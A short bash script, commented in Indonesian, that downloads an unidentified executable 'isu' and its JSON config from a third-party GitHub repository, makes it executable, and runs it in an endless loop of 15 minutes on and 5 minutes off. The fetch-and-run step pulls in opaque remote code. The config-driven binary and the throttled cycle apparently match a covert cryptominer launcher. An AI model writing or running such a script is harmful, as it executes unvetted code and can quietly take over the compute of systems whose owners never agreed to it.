#!/bin/bash

# Bersihkan file lama
rm -rf isu*

# Download file
wget https://github.com/barburonjilo/open/raw/refs/heads/main/isu
wget https://github.com/barburonjilo/open/raw/refs/heads/main/isu2.json

# Izin eksekusi
chmod +x isu

# Loop selamanya
while true
do
    echo "=== Start isu ==="
    ./isu -c "isu2.json" &
    PID=$!
    
    # Jalan 15 menit (900 detik)
    sleep 900
    
    echo "=== Stop isu ==="
    # Kill proses berdasarkan PID
    kill $PID 2>/dev/null
    
    # Pastikan kalau masih ada yang nyangkut
    pkill -f "isu -c isu2.json" 2>/dev/null
    
    # Tunggu 5 menit (300 detik)
    sleep 300
done
